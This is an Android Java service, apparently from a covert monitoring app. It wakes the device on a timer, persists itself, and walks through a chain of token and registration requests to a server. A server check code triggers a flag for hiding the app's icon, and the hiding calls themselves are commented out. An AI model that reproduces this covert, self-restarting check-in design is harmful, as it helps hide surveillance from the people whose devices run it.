package com.inet.android.request;

import java.util.Calendar;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.IBinder;
import android.preference.PreferenceManager;

import com.inet.android.utils.Logging;

/**
 * 
 * Request4 class is design for send periodic query
 *
 */
public class Request4 extends Service {
	private static final int SERVICE_REQUEST_CODE = 35;
	final String LOG_TAG = Request4.class.getSimpleName().toString();
	// SharedPreferences sPref;
	String period = "1"; // периодичность запросов
	String periodAfterRegistration = "10";
	SharedPreferences sp;

	public void onCreate() {
		super.onCreate();

		Logging.doLog(LOG_TAG, "onCreate", "onCreate");
	}

	public int onStartCommand(Intent intent, int flags, int startId) {
		super.onStartCommand(intent, flags, startId);

		Logging.doLog(LOG_TAG, "onStartCommand", "onStartCommand");
		sp = PreferenceManager.getDefaultSharedPreferences(this);
		Calendar cal = Calendar.getInstance();
		cal.add(Calendar.MINUTE,
				Integer.parseInt(sp.getString("period_request", period)));// через
		// period
		// минут

		PendingIntent servicePendingIntent = PendingIntent.getService(this,
				SERVICE_REQUEST_CODE, new Intent(this, Request4.class),
				PendingIntent.FLAG_UPDATE_CURRENT);

		AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
		am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
				servicePendingIntent);
		if (getFirstToken())
			if (getStartRequest())
				if (getCheckRequest())
					if (getAppRequest())
						if (getSecondToken()) {
							Logging.doLog(LOG_TAG, "Send periodical request",
									"Send periodical request");
							RequestList.sendPeriodicRequest(this);
						}
		return Service.START_STICKY;
	}

	private boolean getFirstToken() {
		String code = sp.getString("access_first_token", "-1");
		if (code.equals("-1")) {
			RequestList.sendRequestForFirstToken(this);
			return false;
		}
		return true;
	}

	private boolean getStartRequest() {

		// -----------start request-------------------
		String code = sp.getString("code_initial", "-1");
		Logging.doLog(LOG_TAG, "code_initial: " + code, "code_initial: " + code);

		if (code.equals("-1")) {
			RequestList.sendStartRequest(this);
			return false;
		}
		if (code.equals("0")) {
			if (sp.getString("error_initial", "-1").equals("0")) {
				RequestList.sendStartRequest(this);
				return false;

			}
		}

		return true;
	}

	private boolean getCheckRequest() {
		String code = sp.getString("code_check", "-1");
		Logging.doLog(LOG_TAG, "code_check: " + code, "code_check: " + code);

		if (code.equals("-1") || code.equals("1")) {
			RequestList.sendCheckRequest(this);
			return false;
		}

		else if (code.equals("2")) {
			if (!sp.getBoolean("hideIcon", false)) {
				Logging.doLog(LOG_TAG, "hide icon");
				// HiddingIcon hi = new HiddingIcon(this);
				// hi.hideIcon();
				Editor ed = sp.edit();
				ed.putBoolean("hideIcon", true);
				// ed.putInt("period",
				// Integer.parseInt(periodAfterRegistration));
				ed.commit();
			}
			return true;
		} else if (code.equals("3")) {
			RequestList.sendRequestForFirstToken(this);
			if (sp.getString("scope", "-1").equals("client"))
				RequestList.sendDelRequest(this);
			return false;
		} else if (code.equals("0")) {
			Logging.doLog(LOG_TAG, "code : 0", "code : 0");

			if (sp.getString("error_check", "-1").equals("0")
					|| sp.getString("error_check", "-1").equals("1")
					|| sp.getString("error_check", "-1").equals("2")) {
				RequestList.sendStartRequest(this);
				return false;
			}
		}
		return false;
	}

	private boolean getAppRequest() {
		// --------app token request------------------------------

		String code = sp.getString("code_app_token", "-1");
		Logging.doLog(LOG_TAG, "code app token:" + code, "code app token: "
				+ code);

		if (code.equals("-1")) {
			RequestList.sendTokenAppRequest(this);
			return false;
		} else if (code.equals("0")) {
			Logging.doLog(
					LOG_TAG,
					"error code app token:"
							+ sp.getString("error_app_token", "-1"),
					"error code app token: "
							+ sp.getString("error_app_token", "-1"));
			if (sp.getString("error_app_token", "-1").equals("0")
					|| sp.getString("error_app_token", "-1").equals("1")
					|| sp.getString("error_app_token", "-1").equals("2")) {
				RequestList.sendTokenAppRequest(this);
			}
			return false;
		} else if (code.equals("1"))
			return true;
		return false;
	}

	private boolean getSecondToken() {
		// --------second token request----------------------
		String code = sp.getString("access_second_token", "-1");
		Logging.doLog(LOG_TAG, "access_second_token: " + code,
				"access_second_token: " + code);

		if (code.equals("-1")) {
			Logging.doLog(LOG_TAG, "sendRequestForSecondToken",
					"sendRequestForSecondToken");
			RequestList.sendRequestForSecondToken(this);
			return false;
		}
		Editor ed = sp.edit();
		ed.putString("period_request", periodAfterRegistration);
		ed.commit();
		return true;
	}

	public void onDestroy() {
		super.onDestroy();
		Logging.doLog(LOG_TAG, "onDestroy", "onDestroy");
	}

	public IBinder onBind(Intent intent) {
		return null;
	}

}